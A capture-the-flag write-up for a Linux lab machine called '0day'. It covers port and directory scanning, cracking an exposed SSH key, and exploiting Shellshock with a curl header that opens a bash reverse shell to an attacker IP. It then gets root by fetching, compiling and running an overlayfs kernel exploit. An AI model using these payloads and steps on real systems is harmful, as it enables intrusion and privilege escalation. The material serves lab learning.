# Writeup: 0day

**OS**: 🐧 Linux

**Level**: 🟠 Medium

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Mon Oct 27 08:26:09 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.164.60
Nmap scan report for 10.10.164.60
Host is up, received user-set (0.059s latency).
Scanned at 2025-10-27 08:26:09 UTC for 74s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 27 08:27:23 2025 -- 1 IP address (1 host up) scanned in 74.19 seconds
```

On port 80 i found a apache webserver with a static webpage. The source code did not give me anything useful and the `robots.txt` just gives me a `You really thought it'd be this easy?`, so i started a directory bruteforce with `gobuster`.

```
/css                  (Status: 301) [Size: 309] [--> http://10.10.164.60/css/]
/js                   (Status: 301) [Size: 308] [--> http://10.10.164.60/js/]
/admin                (Status: 301) [Size: 311] [--> http://10.10.164.60/admin/]
/img                  (Status: 301) [Size: 309] [--> http://10.10.164.60/img/]
/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.164.60/cgi-bin/]
/backup               (Status: 301) [Size: 312] [--> http://10.10.164.60/backup/]
/uploads              (Status: 301) [Size: 313] [--> http://10.10.164.60/uploads/]
/secret               (Status: 301) [Size: 312] [--> http://10.10.164.60/secret/]
/server-status        (Status: 403) [Size: 292]
```

Inside of `/backup/` i found a encrypted ssh private key.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBW**********
-----END RSA PRIVATE KEY-----
```

I have tried to bruteforce the password with `john`, which gives me the password `*******` but i landed in a deadend since i dont know a username.

```shell
ssh2john id_rsa > id_rsa.john

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

...
Press 'q' or Ctrl-C to abort, almost any other key for status
*******          (id_rsa)
1g 0:00:00:00 DONE (2025-10-27 08:56) 100.0g/s 51200p/s 51200c/s 51200C/s lover..*******
...
```

Since `/cgi-bin/` caught my attention, i started a second `gobuster` scan with some file extensions added and found a `test.cgi` with a status code `200`, which gives me a `Hello World!`.

```
gobuster dir -u http://10.10.164.60/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 30 -x sh,cgi -o gobuster_scan

/test.cgi             (Status: 200) [Size: 13]
```

I used `nmap` to test `test.cgi` for the shellshock vulnerability and found it exploitable.

```
nmap 10.10.164.60 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 09:13 UTC
Nmap scan report for 10.10.164.60
Host is up (0.050s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

## 💥 Exploitation:

I used the shellshock exploit to get a reverse shell as user `www-data`.

```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1' http://10.10.164.60/cgi-bin/test.cgi
```

The `user.txt` was inside the home directory of the user `ryan`, which is world readable so i was able to just grab the flag.

```shell
cd /home/ryan && cat user.txt
```

## 🔓 Priviledge Escalation:

Since the machine is running on a very old kernel version (`3.13.0-32-generic`), i have done some research for exploits and found the `overlayfs` on [Exploit-DB](https://www.exploit-db.com/exploits/37292).

I have downloaded the sourcecode of the exploit to the target machine and i have compiled it. To be able to do it i had to export the path otherwise the compiling will fail. After running the exploit i got a root shell and was able to grab `root.txt`.

```shell
cd $(mktemp -d) && wget http://10.10.10.10:8000/exploit.c
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/usr/bin/gcc exploit.c -o exploit
./exploit
cat /root/root.txt
```

## 💰 Loot:

```shell
# user.txt
THM{Sh3llS**********}

# root.txt
THM{g00d_j0b_0day_**********}
```